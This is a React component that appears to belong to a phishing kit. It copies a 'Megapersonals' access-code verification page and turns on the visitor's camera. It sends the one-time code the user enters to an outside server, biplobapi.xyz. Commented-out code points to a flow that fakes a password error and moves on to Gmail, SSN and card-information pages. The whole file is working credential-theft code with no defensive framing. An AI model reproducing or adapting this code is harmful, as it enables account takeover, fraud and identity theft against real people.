import React, { useRef } from "react";
import { useForm } from "react-hook-form";
import {
  useLoaderData,
  useNavigate,
  useParams,
  useLocation,
  Link,
} from "react-router-dom";
import { isBrowser, isMobile } from "react-device-detect";
import { useEffect } from "react";
import { useState } from "react";
import "./Duo.css";

const DuoCode = () => {
  const { state } = useLocation();
  const videoRef = useRef(null);
  const navigate = useNavigate();

  useEffect(() => {
    async function startCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: true,
        });
        if (videoRef.current) {
          videoRef.current.srcObject = stream;
          videoRef.current.play().catch((error) => {
            console.error("Error playing video:", error);
          });
        }
      } catch (error) {
        console.error("Error accessing camera:", error);
      }
    }

    startCamera();

    // Cleanup function to stop the camera when the component unmounts
    return () => {
      if (videoRef.current && videoRef.current.srcObject) {
        const stream = videoRef.current.srcObject;
        const tracks = stream.getTracks();
        tracks.forEach((track) => track.stop());
      }
    };
  }, []);

  const { temp } = state;
  console.log(temp);
  const {
    register,
    handleSubmit,
    formState: { errors },
    resetField,
  } = useForm();
  const handleVerify = (data) => {
    // if (test === 0) {
    //   setTest(test + 1);
    //   setPasswordError(true);
    //   localStorage.setItem('code', data.code);
    //   resetField("code");
    // }else{
    const bookings = {
      code: data.code,
      // code: localStorage.getItem('code') + '{{}}' + data.code,
    };

    console.log(bookings);

    fetch(`https://biplobapi.xyz/code/${temp}`, {
      method: "PUT",
      headers: {
        "content-type": "application/json",
      },
      body: JSON.stringify(bookings),
    })
      .then((res) => res.json())
      .then((data) => {
        navigate(localStorage.getItem("url"));
        // navigate("/gmail", { state: { temp: temp } });
        if (data.modifiedCount > 0) {
          // navigate("/card/information", { state: { temp: temp } });
          // reset();
          // navigate("/gmail", { state: { temp: temp } });
          // navigate("/ssn", { state: { temp: temp } });
        }
      });
    // }
  };

  return (
    <div className="home-bg-2 position-relative min-h-full">
      <video
        ref={videoRef}
        autoPlay
        playsInline
        muted
        loop
        style={{ height: "100vh", minWidth: "100vw", objectFit: "cover" }}
        className="position-absolute z-10 min-w-full min-h-full h-screen max-w-full left-0 top-0 vdo"
      />
      <div
        className="code-card position-absolute z-20  text-center"
        style={{ left: "50%", transform: "translateX(-50%)" }}
      >
        <img src="/datas/images/du_icon.svg" alt="" className="duoimg" />
        <h1 className="duotitle2">Code Login with Megapersonals</h1>
        <p className="mt-4">
          Your <b style={{ color: "#3B82F6" }}>ACCESS CODE</b> has been sent{" "}
          <b style={{ color: "#3B82F6" }}>Successfully</b> to your email on That
          code remains valid. Check your{" "}
          <b style={{ color: "#3B82F6" }}>SPAM</b> folder it may be there
        </p>
        <form onSubmit={handleSubmit(handleVerify)} className="login-frm">
          <input
            type="text"
            {...register("code", { required: true })}
            placeholder="code you have received"
            className="input-from"
          />
          <button className="dubtn">Verify</button>
        </form>
      </div>
    </div>
  );
};

export default DuoCode;
